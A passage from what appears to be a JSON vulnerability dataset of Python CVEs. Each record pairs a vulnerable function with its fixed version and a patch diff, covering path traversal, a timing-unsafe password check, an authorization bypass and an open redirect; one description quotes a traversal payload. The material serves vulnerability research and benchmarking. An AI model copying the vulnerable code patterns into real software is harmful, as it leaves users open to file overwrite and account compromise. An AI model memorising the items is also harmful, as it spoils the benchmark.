        "snippet": "    def __init__(self, op):\n        super(FileReceiver, self).__init__()\n        self.save_path = prefs.get_save_path()\n        self.save_path_file = Gio.File.new_for_path(self.save_path)\n        self.op = op\n        self.preserve_perms = prefs.preserve_permissions() and util.save_folder_is_native_fs()\n        self.preserve_timestamp = prefs.preserve_timestamp() and util.save_folder_is_native_fs()\n\n        self.current_path = None\n        self.current_gfile = None\n        self.current_type = None\n        self.current_stream = None\n        self.current_mode = 0\n        self.current_mtime = 0\n        self.current_mtime_usec = 0\n\n        if op.existing:\n            for name in op.top_dir_basenames:\n                try:\n                    path = os.path.join(self.save_path, name)\n                    if os.path.isdir(path): # file not found is ok\n                        shutil.rmtree(path)\n                    else:\n                        os.remove(path)\n                except FileNotFoundError:\n                    pass\n                except Exception as e:\n                    logging.warning(\"Problem removing existing files.  Transfer may not succeed: %s\" % e)\n\n        # We write files top-down.  If we're preserving permissions and we receive\n        # a folder in some hierarchy that is not writable, we won't be able to create\n        # anything inside it.\n        self.folder_permission_change_list = []"
      },
      {
        "id": "fix_py_401_2",
        "commit": "5244c33d4c109ede9607b9d94461650410e2cddc",
        "file_path": "src/transfers.py",
        "start_line": 201,
        "end_line": 232,
        "snippet": "    def receive_data(self, s):\n        save_path = prefs.get_save_path()\n\n        path = os.path.join(save_path, s.relative_path)\n        if path != self.current_path:\n            self.close_current_file()\n            self.current_path = path\n            self.current_mode = s.file_mode\n            self.current_type = s.file_type\n            self.current_mtime = s.time.mtime\n            self.current_mtime_usec = s.time.mtime_usec\n\n        if not self.current_gfile:\n            self.current_gfile = Gio.File.new_for_path(path)\n            # Check for valid path (GFile resolves paths upon creation).\n            if self.save_path_file.get_relative_path(self.current_gfile) is None:\n                raise Exception(_(\"Resolved path is not valid: %s -> %s\") % (path, self.current_gfile.get_path()))\n\n        if s.file_type == FileType.DIRECTORY:\n            os.makedirs(path, exist_ok=True)\n        elif s.file_type == FileType.SYMBOLIC_LINK:\n            make_symbolic_link(self.op, path, s.symlink_target)\n        else:\n            if self.current_stream == None:\n                flags = Gio.FileCreateFlags.REPLACE_DESTINATION\n                self.current_stream = self.current_gfile.replace(None, False, flags, None)\n\n            if not s.chunk:\n                return\n\n            self.current_stream.write_bytes(GLib.Bytes(s.chunk), None)\n            self.op.progress_tracker.update_progress(len(s.chunk))"
      }
    ],
    "vul_patch": "--- a/src/transfers.py\n+++ b/src/transfers.py\n@@ -1,6 +1,7 @@\n     def __init__(self, op):\n         super(FileReceiver, self).__init__()\n         self.save_path = prefs.get_save_path()\n+        self.save_path_file = Gio.File.new_for_path(self.save_path)\n         self.op = op\n         self.preserve_perms = prefs.preserve_permissions() and util.save_folder_is_native_fs()\n         self.preserve_timestamp = prefs.preserve_timestamp() and util.save_folder_is_native_fs()\n\n--- a/src/transfers.py\n+++ b/src/transfers.py\n@@ -12,6 +12,9 @@\n \n         if not self.current_gfile:\n             self.current_gfile = Gio.File.new_for_path(path)\n+            # Check for valid path (GFile resolves paths upon creation).\n+            if self.save_path_file.get_relative_path(self.current_gfile) is None:\n+                raise Exception(_(\"Resolved path is not valid: %s -> %s\") % (path, self.current_gfile.get_path()))\n \n         if s.file_type == FileType.DIRECTORY:\n             os.makedirs(path, exist_ok=True)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-31245",
    "cve_description": "omr-admin.py in openmptcprouter-vps-admin 0.57.3 and earlier compares the user provided password with the original password in a length dependent manner, which allows remote attackers to guess the password via a timing attack.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/Ysurac/openmptcprouter-vps-admin",
    "patch_url": [
      "https://github.com/Ysurac/openmptcprouter-vps-admin/commit/a01cbc8c3d3b8bb7720bf3ff234671b4c0e1859c#diff-b89ee68e63302a732d4bde35eb04a205b06f1611147e139642356f173195ab80"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_361_1",
        "commit": "2694612565aba58cc0a9bd2ad5d550aa4ef7bcf5",
        "file_path": "omr-admin.py",
        "start_line": 778,
        "end_line": 782,
        "snippet": "def verify_password(plain_password, user_password):\n    if plain_password == user_password:\n        LOG.debug(\"password true\")\n        return True\n    return False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_361_1",
        "commit": "a01cbc8c3d3b8bb7720bf3ff234671b4c0e1859c",
        "file_path": "omr-admin.py",
        "start_line": 778,
        "end_line": 782,
        "snippet": "def verify_password(plain_password, user_password):\n    if secrets.compare_digest(plain_password,user_password):\n        LOG.debug(\"password true\")\n        return True\n    return False"
      }
    ],
    "vul_patch": "--- a/omr-admin.py\n+++ b/omr-admin.py\n@@ -1,5 +1,5 @@\n def verify_password(plain_password, user_password):\n-    if plain_password == user_password:\n+    if secrets.compare_digest(plain_password,user_password):\n         LOG.debug(\"password true\")\n         return True\n     return False\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31564",
    "cve_description": "The woduq1414/munhak-moa repository before 2022-05-03 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/woduq1414/munhak-moa",
    "patch_url": [
      "https://github.com/woduq1414/munhak-moa/commit/e8f800373b20cb22de70c7a994325b8903877da0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_318_1",
        "commit": "cdcc989",
        "file_path": "app.py",
        "start_line": "264",
        "end_line": "278",
        "snippet": "@app.route('/images/<path:path>')\ndef get_image(path):\n    def get_absolute_path(path):\n        import os\n        script_dir = os.path.dirname(__file__)  # <-- absolute dir the script is in\n        rel_path = path\n        abs_file_path = os.path.join(script_dir, rel_path)\n        return abs_file_path\n\n    return send_file(\n        get_absolute_path(f\"./images/{path}\"),\n        mimetype='image/png',\n        attachment_filename='snapshot.png',\n        cache_timeout=0\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_318_1",
        "commit": "e8f8003",
        "file_path": "app.py",
        "start_line": "265",
        "end_line": "279",
        "snippet": "@app.route('/images/<path:path>')\ndef get_image(path):\n    def get_absolute_path(path):\n        import os\n        script_dir = os.path.dirname(__file__)  # <-- absolute dir the script is in\n        rel_path = path\n        abs_file_path = safe_join(script_dir, rel_path)\n        return abs_file_path\n\n    return send_file(\n        get_absolute_path(f\"./images/{path}\"),\n        mimetype='image/png',\n        attachment_filename='snapshot.png',\n        cache_timeout=0\n    )"
      },
      {
        "id": "fix_py_318_2",
        "commit": "e8f8003",
        "file_path": "app.py",
        "start_line": "4",
        "end_line": "4",
        "snippet": "from werkzeug.utils import safe_join"
      }
    ],
    "vul_patch": "--- a/app.py\n+++ b/app.py\n@@ -4,7 +4,7 @@\n         import os\n         script_dir = os.path.dirname(__file__)  # <-- absolute dir the script is in\n         rel_path = path\n-        abs_file_path = os.path.join(script_dir, rel_path)\n+        abs_file_path = safe_join(script_dir, rel_path)\n         return abs_file_path\n \n     return send_file(\n\n--- /dev/null\n+++ b/app.py\n@@ -0,0 +1 @@\n+from werkzeug.utils import safe_join\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-0591",
    "cve_description": "\nubireader_extract_files is vulnerable to path traversal when run against specifically crafted UBIFS files, allowing the attacker to overwrite files outside of the extraction directory (provided the process has write access to that file or directory).\n\nThis is due to the fact that a node name (dent_node.name) is considered trusted and joined to the extraction directory path during processing, then the node content is written to that joined path. By crafting a malicious UBIFS file with node names holding path traversal payloads (e.g. ../../tmp/outside.txt), it's possible to force ubi_reader to write outside of the extraction directory.\n\n\n\nThis issue affects ubi-reader before 0.8.5.\n\n",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/jrspruitt/ubi_reader",
    "patch_url": [
      "https://github.com/jrspruitt/ubi_reader/commit/d5d68e6b1b9f7070c29df5f67fc060f579ae9139"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_398_1",
        "commit": "b04b1bd67d2e664bd0e0b47c1c74425b05d1bb5b",
        "file_path": "ubireader/ubifs/output.py",
        "start_line": 56,
        "end_line": 148,
        "snippet": "def extract_dents(ubifs, inodes, dent_node, path='', perms=False):\n    if dent_node.inum not in inodes:\n        error(extract_dents, 'Error', 'inum: %s not found in inodes' % (dent_node.inum))\n        return\n\n    inode = inodes[dent_node.inum]\n    dent_path = os.path.join(path, dent_node.name)\n        \n    if dent_node.type == UBIFS_ITYPE_DIR:\n        try:\n            if not os.path.exists(dent_path):\n                os.mkdir(dent_path)\n                log(extract_dents, 'Make Dir: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'DIR Fail: %s' % e)\n\n        if 'dent' in inode:\n            for dnode in inode['dent']:\n                extract_dents(ubifs, inodes, dnode, dent_path, perms)\n\n        _set_file_timestamps(dent_path, inode)\n\n    elif dent_node.type == UBIFS_ITYPE_REG:\n        try:\n            if inode['ino'].nlink > 1:\n                if 'hlink' not in inode:\n                    inode['hlink'] = dent_path\n                    buf = _process_reg_file(ubifs, inode, dent_path)\n                    _write_reg_file(dent_path, buf)\n                else:\n                    os.link(inode['hlink'], dent_path)\n                    log(extract_dents, 'Make Link: %s > %s' % (dent_path, inode['hlink']))\n            else:\n                buf = _process_reg_file(ubifs, inode, dent_path)\n                _write_reg_file(dent_path, buf)\n\n            _set_file_timestamps(dent_path, inode)\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FILE Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_LNK:\n        try:\n            # probably will need to decompress ino data if > UBIFS_MIN_COMPR_LEN\n            os.symlink('%s' % inode['ino'].data.decode('utf-8'), dent_path)\n            log(extract_dents, 'Make Symlink: %s > %s' % (dent_path, inode['ino'].data))\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SYMLINK Fail: %s' % e) \n\n    elif dent_node.type in [UBIFS_ITYPE_BLK, UBIFS_ITYPE_CHR]:\n        try:\n            dev = struct.unpack('<II', inode['ino'].data)[0]\n            if not settings.use_dummy_devices:\n                os.mknod(dent_path, inode['ino'].mode, dev)\n                log(extract_dents, 'Make Device Node: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n            else:\n                log(extract_dents, 'Create dummy device.')\n                _write_reg_file(dent_path, str(dev))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n                \n        except Exception as e:\n            error(extract_dents, 'Warn', 'DEV Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_FIFO:\n        try:\n            os.mkfifo(dent_path, inode['ino'].mode)\n            log(extract_dents, 'Make FIFO: %s' % (path))\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FIFO Fail: %s : %s' % (dent_path, e))\n\n    elif dent_node.type == UBIFS_ITYPE_SOCK:\n        try:\n            if settings.use_dummy_socket_file:\n                _write_reg_file(dent_path, '')\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SOCK Fail: %s : %s' % (dent_path, e))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_398_1",
        "commit": "d5d68e6b1b9f7070c29df5f67fc060f579ae9139",
        "file_path": "ubireader/ubifs/output.py",
        "start_line": 60,
        "end_line": 156,
        "snippet": "def extract_dents(ubifs, inodes, dent_node, path='', perms=False):\n    if dent_node.inum not in inodes:\n        error(extract_dents, 'Error', 'inum: %s not found in inodes' % (dent_node.inum))\n        return\n\n    inode = inodes[dent_node.inum]\n\n    if not is_safe_path(path, dent_node.name):\n        error(extract_dents, 'Warning', 'Path traversal attempt: %s, discarding' % (dent_node.name))\n        return\n    dent_path = os.path.realpath(os.path.join(path, dent_node.name))\n\n    if dent_node.type == UBIFS_ITYPE_DIR:\n        try:\n            if not os.path.exists(dent_path):\n                os.mkdir(dent_path)\n                log(extract_dents, 'Make Dir: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'DIR Fail: %s' % e)\n\n        if 'dent' in inode:\n            for dnode in inode['dent']:\n                extract_dents(ubifs, inodes, dnode, dent_path, perms)\n\n        _set_file_timestamps(dent_path, inode)\n\n    elif dent_node.type == UBIFS_ITYPE_REG:\n        try:\n            if inode['ino'].nlink > 1:\n                if 'hlink' not in inode:\n                    inode['hlink'] = dent_path\n                    buf = _process_reg_file(ubifs, inode, dent_path)\n                    _write_reg_file(dent_path, buf)\n                else:\n                    os.link(inode['hlink'], dent_path)\n                    log(extract_dents, 'Make Link: %s > %s' % (dent_path, inode['hlink']))\n            else:\n                buf = _process_reg_file(ubifs, inode, dent_path)\n                _write_reg_file(dent_path, buf)\n\n            _set_file_timestamps(dent_path, inode)\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FILE Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_LNK:\n        try:\n            # probably will need to decompress ino data if > UBIFS_MIN_COMPR_LEN\n            os.symlink('%s' % inode['ino'].data.decode('utf-8'), dent_path)\n            log(extract_dents, 'Make Symlink: %s > %s' % (dent_path, inode['ino'].data))\n\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SYMLINK Fail: %s' % e) \n\n    elif dent_node.type in [UBIFS_ITYPE_BLK, UBIFS_ITYPE_CHR]:\n        try:\n            dev = struct.unpack('<II', inode['ino'].data)[0]\n            if not settings.use_dummy_devices:\n                os.mknod(dent_path, inode['ino'].mode, dev)\n                log(extract_dents, 'Make Device Node: %s' % (dent_path))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n            else:\n                log(extract_dents, 'Create dummy device.')\n                _write_reg_file(dent_path, str(dev))\n\n                if perms:\n                    _set_file_perms(dent_path, inode)\n                \n        except Exception as e:\n            error(extract_dents, 'Warn', 'DEV Fail: %s' % e)\n\n    elif dent_node.type == UBIFS_ITYPE_FIFO:\n        try:\n            os.mkfifo(dent_path, inode['ino'].mode)\n            log(extract_dents, 'Make FIFO: %s' % (path))\n\n            if perms:\n                _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'FIFO Fail: %s : %s' % (dent_path, e))\n\n    elif dent_node.type == UBIFS_ITYPE_SOCK:\n        try:\n            if settings.use_dummy_socket_file:\n                _write_reg_file(dent_path, '')\n                if perms:\n                    _set_file_perms(dent_path, inode)\n        except Exception as e:\n            error(extract_dents, 'Warn', 'SOCK Fail: %s : %s' % (dent_path, e))"
      }
    ],
    "vul_patch": "--- a/ubireader/ubifs/output.py\n+++ b/ubireader/ubifs/output.py\n@@ -4,8 +4,12 @@\n         return\n \n     inode = inodes[dent_node.inum]\n-    dent_path = os.path.join(path, dent_node.name)\n-        \n+\n+    if not is_safe_path(path, dent_node.name):\n+        error(extract_dents, 'Warning', 'Path traversal attempt: %s, discarding' % (dent_node.name))\n+        return\n+    dent_path = os.path.realpath(os.path.join(path, dent_node.name))\n+\n     if dent_node.type == UBIFS_ITYPE_DIR:\n         try:\n             if not os.path.exists(dent_path):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-31606",
    "cve_description": "furlongm openvpn-monitor through 1.1.3 allows Authorization Bypass to disconnect arbitrary clients.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/furlongm/openvpn-monitor",
    "patch_url": [
      "https://github.com/furlongm/openvpn-monitor/commit/ddb9d31ef0ec56f578bdacf99ebe9d68455ed8ca"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_111_1",
        "commit": "304203f",
        "file_path": "openvpn-monitor.py",
        "start_line": 178,
        "end_line": 215,
        "snippet": "    def __init__(self, cfg, **kwargs):\n        self.vpns = cfg.vpns\n\n        if kwargs.get('vpn_id'):\n            vpn = self.vpns[kwargs['vpn_id']]\n            self._socket_connect(vpn)\n            if vpn['socket_connected']:\n                release = self.send_command('version\\n')\n                version = semver(self.parse_version(release).split(' ')[1])\n                if version.major == 2 and \\\n                        version.minor >= 4 and \\\n                        kwargs.get('client_id'):\n                    command = 'client-kill {0!s}\\n'.format(kwargs['client_id'])\n                else:\n                    command = 'kill {0!s}:{1!s}\\n'.format(kwargs['ip'], kwargs['port'])\n                self.send_command(command)\n                self._socket_disconnect()\n\n        geoip_data = cfg.settings['geoip_data']\n        self.geoip_version = None\n        self.gi = None\n        try:\n            if geoip_data.endswith('.mmdb') and geoip2_available:\n                self.gi = database.Reader(geoip_data)\n                self.geoip_version = 2\n            elif geoip_data.endswith('.dat') and geoip1_available:\n                self.gi = geoip1.open(geoip_data, geoip1.GEOIP_STANDARD)\n                self.geoip_version = 1\n            else:\n                warning('No compatible geoip1 or geoip2 data/libraries found.')\n        except IOError:\n            warning('No compatible geoip1 or geoip2 data/libraries found.')\n\n        for _, vpn in list(self.vpns.items()):\n            self._socket_connect(vpn)\n            if vpn['socket_connected']:\n                self.collect_data(vpn)\n                self._socket_disconnect()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_111_1",
        "commit": "ddb9d31",
        "file_path": "openvpn-monitor.py",
        "start_line": 178,
        "end_line": 223,
        "snippet": "    def __init__(self, cfg, **kwargs):\n        self.vpns = cfg.vpns\n\n        if kwargs.get('vpn_id'):\n            vpn = self.vpns[kwargs['vpn_id']]\n            disconnection_allowed = vpn['show_disconnect']\n            if disconnection_allowed:\n                self._socket_connect(vpn)\n                if vpn['socket_connected']:\n                    release = self.send_command('version\\n')\n                    version = semver(self.parse_version(release).split(' ')[1])\n                    command = False\n                    client_id = int(kwargs.get('client_id'))\n                    if version.major == 2 and \\\n                            version.minor >= 4 and \\\n                            client_id:\n                        command = 'client-kill {0!s}\\n'.format(client_id)\n                    else:\n                        ip = ip_address(kwargs['ip'])\n                        port = int(kwargs['port'])\n                        if ip and port:\n                            command = 'kill {0!s}:{1!s}\\n'.format(ip, port)\n                    if command:\n                        self.send_command(command)\n                    self._socket_disconnect()\n\n        geoip_data = cfg.settings['geoip_data']\n        self.geoip_version = None\n        self.gi = None\n        try:\n            if geoip_data.endswith('.mmdb') and geoip2_available:\n                self.gi = database.Reader(geoip_data)\n                self.geoip_version = 2\n            elif geoip_data.endswith('.dat') and geoip1_available:\n                self.gi = geoip1.open(geoip_data, geoip1.GEOIP_STANDARD)\n                self.geoip_version = 1\n            else:\n                warning('No compatible geoip1 or geoip2 data/libraries found.')\n        except IOError:\n            warning('No compatible geoip1 or geoip2 data/libraries found.')\n\n        for _, vpn in list(self.vpns.items()):\n            self._socket_connect(vpn)\n            if vpn['socket_connected']:\n                self.collect_data(vpn)\n                self._socket_disconnect()"
      }
    ],
    "vul_patch": "--- a/openvpn-monitor.py\n+++ b/openvpn-monitor.py\n@@ -3,18 +3,26 @@\n \n         if kwargs.get('vpn_id'):\n             vpn = self.vpns[kwargs['vpn_id']]\n-            self._socket_connect(vpn)\n-            if vpn['socket_connected']:\n-                release = self.send_command('version\\n')\n-                version = semver(self.parse_version(release).split(' ')[1])\n-                if version.major == 2 and \\\n-                        version.minor >= 4 and \\\n-                        kwargs.get('client_id'):\n-                    command = 'client-kill {0!s}\\n'.format(kwargs['client_id'])\n-                else:\n-                    command = 'kill {0!s}:{1!s}\\n'.format(kwargs['ip'], kwargs['port'])\n-                self.send_command(command)\n-                self._socket_disconnect()\n+            disconnection_allowed = vpn['show_disconnect']\n+            if disconnection_allowed:\n+                self._socket_connect(vpn)\n+                if vpn['socket_connected']:\n+                    release = self.send_command('version\\n')\n+                    version = semver(self.parse_version(release).split(' ')[1])\n+                    command = False\n+                    client_id = int(kwargs.get('client_id'))\n+                    if version.major == 2 and \\\n+                            version.minor >= 4 and \\\n+                            client_id:\n+                        command = 'client-kill {0!s}\\n'.format(client_id)\n+                    else:\n+                        ip = ip_address(kwargs['ip'])\n+                        port = int(kwargs['port'])\n+                        if ip and port:\n+                            command = 'kill {0!s}:{1!s}\\n'.format(ip, port)\n+                    if command:\n+                        self.send_command(command)\n+                    self._socket_disconnect()\n \n         geoip_data = cfg.settings['geoip_data']\n         self.geoip_version = None\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-52787",
    "cve_description": "An issue in the upload_documents method of libre-chat v0.0.6 allows attackers to execute a path traversal via supplying a crafted filename in an uploaded file.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/vemonet/libre-chat",
    "patch_url": [
      "https://github.com/vemonet/libre-chat/commit/dbb8e3400e5258112179783d74c9cc54310cb72b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_274_1",
        "commit": "84b9288",
        "file_path": "src/libre_chat/router.py",
        "start_line": 113,
        "end_line": 142,
        "snippet": "        def upload_documents(\n            files: List[UploadFile] = File(...),\n            admin_pass: Optional[str] = None,\n            # current_user: User = Depends(get_current_user),\n        ) -> JSONResponse:\n            os.makedirs(self.conf.vector.documents_path, exist_ok=True)\n            if self.conf.auth.admin_pass and admin_pass != self.conf.auth.admin_pass:\n                raise HTTPException(\n                    status_code=403,\n                    detail=\"The admin pass key provided was wrong\",\n                )\n            for uploaded in files:\n                if uploaded.filename:  # no cov\n                    file_path = os.path.join(self.conf.vector.documents_path, uploaded.filename)\n                    with open(file_path, \"wb\") as file:\n                        file.write(uploaded.file.read())\n                    # Check if the uploaded file is a zip file\n                    if uploaded.filename.endswith(\".zip\"):\n                        log.info(f\"\\ud83e\\udd10 Unzipping {file_path}\")\n                        with zipfile.ZipFile(file_path, \"r\") as zip_ref:\n                            zip_ref.extractall(self.conf.vector.documents_path)\n                        os.remove(file_path)\n            # TODO: add just the uploaded files instead of rebuilding the triplestore\n            self.llm.build_vectorstore()\n            self.llm.setup_dbqa()\n            return JSONResponse(\n                {\n                    \"message\": f\"Documents uploaded in {self.conf.vector.documents_path}, vectorstore rebuilt.\"\n                }\n            )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_274_1",
        "commit": "dbb8e3400e5258112179783d74c9cc54310cb72b",
        "file_path": "src/libre_chat/router.py",
        "start_line": 114,
        "end_line": 149,
        "snippet": "        def upload_documents(\n            files: List[UploadFile] = File(...),\n            admin_pass: Optional[str] = None,\n            # current_user: User = Depends(get_current_user),\n        ) -> JSONResponse:\n            os.makedirs(self.conf.vector.documents_path, exist_ok=True)\n            if self.conf.auth.admin_pass and admin_pass != self.conf.auth.admin_pass:\n                raise HTTPException(\n                    status_code=403,\n                    detail=\"The admin pass key provided was wrong\",\n                )\n            for uploaded in files:\n                if uploaded.filename:  # no cov\n                    file_path = werkzeug.utils.safe_join(self.conf.vector.documents_path, uploaded.filename)\n                    if file_path is None:\n                        raise HTTPException(\n                            status_code=403,\n                            detail=f\"Invalid file name: {uploaded.filename}\",\n                        )\n\n                    with open(file_path, \"wb\") as file:\n                        file.write(uploaded.file.read())\n                    # Check if the uploaded file is a zip file\n                    if uploaded.filename.endswith(\".zip\"):\n                        log.info(f\"\\ud83e\\udd10 Unzipping {file_path}\")\n                        with zipfile.ZipFile(file_path, \"r\") as zip_ref:\n                            zip_ref.extractall(self.conf.vector.documents_path)\n                        os.remove(file_path)\n            # TODO: add just the uploaded files instead of rebuilding the triplestore\n            self.llm.build_vectorstore()\n            self.llm.setup_dbqa()\n            return JSONResponse(\n                {\n                    \"message\": f\"Documents uploaded in {self.conf.vector.documents_path}, vectorstore rebuilt.\"\n                }\n            )"
      }
    ],
    "vul_patch": "--- a/src/libre_chat/router.py\n+++ b/src/libre_chat/router.py\n@@ -11,7 +11,13 @@\n                 )\n             for uploaded in files:\n                 if uploaded.filename:  # no cov\n-                    file_path = os.path.join(self.conf.vector.documents_path, uploaded.filename)\n+                    file_path = werkzeug.utils.safe_join(self.conf.vector.documents_path, uploaded.filename)\n+                    if file_path is None:\n+                        raise HTTPException(\n+                            status_code=403,\n+                            detail=f\"Invalid file name: {uploaded.filename}\",\n+                        )\n+\n                     with open(file_path, \"wb\") as file:\n                         file.write(uploaded.file.read())\n                     # Check if the uploaded file is a zip file\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-1002150",
    "cve_description": "python-fedora 0.8.0 and lower is vulnerable to an open redirect resulting in loss of CSRF protection",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/fedora-infra/python-fedora",
    "patch_url": [
      "https://github.com/fedora-infra/python-fedora/commit/b27f38a67573f4c989710c9bfb726dd4c1eeb929.patch",
      "https://github.com/fedora-infra/python-fedora/commit/b27f38a67573f4c989710c9bfb726dd4c1eeb929"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_276_1",
        "commit": "6cf9094",
        "file_path": "fedora/tg/utils.py",
        "start_line": 60,
        "end_line": 137,
        "snippet": "def url(tgpath, tgparams=None, **kwargs):\n    '''Computes URLs.\n\n    This is a replacement for :func:`turbogears.controllers.url` (aka\n    :func:`tg.url` in the template).  In addition to the functionality that\n    :func:`tg.url` provides, it adds a token to prevent :term:`CSRF` attacks.\n\n    :arg tgpath:  a list or a string. If the path is absolute (starts\n        with a \"/\"), the :attr:`server.webpath`, :envvar:`SCRIPT_NAME` and\n        the approot of the application are prepended to the path. In order for\n        the approot to be detected properly, the root object should extend\n        :class:`turbogears.controllers.RootController`.\n    :kwarg tgparams: See param: ``kwargs``\n    :kwarg kwargs: Query parameters for the URL can be passed in as a\n        dictionary in the second argument *or* as keyword parameters.\n        Values which are a list or a tuple are used to create multiple\n        key-value pairs.\n    :returns: The changed path\n\n    .. versionadded:: 0.3.10\n       Modified from turbogears.controllers.url for :ref:`CSRF-Protection`\n    '''\n    if not isinstance(tgpath, six.string_types):\n        tgpath = '/'.join(list(tgpath))\n    if tgpath.startswith('/'):\n        webpath = (config.get('server.webpath') or '').rstrip('/')\n        if tg_util.request_available():\n            check_app_root()\n            tgpath = request.app_root + tgpath\n            try:\n                webpath += request.wsgi_environ['SCRIPT_NAME'].rstrip('/')\n            except (AttributeError, KeyError):  # pylint: disable-msg=W0704\n                # :W0704: Lack of wsgi environ is fine... we still have\n                # server.webpath\n                pass\n        tgpath = webpath + tgpath\n    if tgparams is None:\n        tgparams = kwargs\n    else:\n        try:\n            tgparams = tgparams.copy()\n            tgparams.update(kwargs)\n        except AttributeError:\n            raise TypeError(\n                'url() expects a dictionary for query parameters')\n    args = []\n    # Add the _csrf_token\n    try:\n        if identity.current.csrf_token:\n            tgparams.update({'_csrf_token': identity.current.csrf_token})\n    except RequestRequiredException:  # pylint: disable-msg=W0704\n        # :W0704: If we are outside of a request (called from non-controller\n        # methods/ templates) just don't set the _csrf_token.\n        pass\n\n    # Check for query params in the current url\n    query_params = six.iteritems(tgparams)\n    scheme, netloc, path, params, query_s, fragment = urlparse(tgpath)\n    if query_s:\n        query_params = chain((p for p in cgi.parse_qsl(query_s) if p[0] !=\n                              '_csrf_token'), query_params)\n\n    for key, value in query_params:\n        if value is None:\n            continue\n        if isinstance(value, (list, tuple)):\n            pairs = [(key, v) for v in value]\n        else:\n            pairs = [(key, value)]\n        for key, value in pairs:\n            if value is None:\n                continue\n            if isinstance(value, unicode):\n                value = value.encode('utf8')\n            args.append((key, str(value)))\n    query_string = urlencode(args, True)\n    tgpath = urlunparse((scheme, netloc, path, params, query_string, fragment))\n    return tgpath"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_276_1",
        "commit": "b27f38a67573f4c989710c9bfb726dd4c1eeb929",
        "file_path": "fedora/tg/utils.py",
        "start_line": 60,
        "end_line": 142,
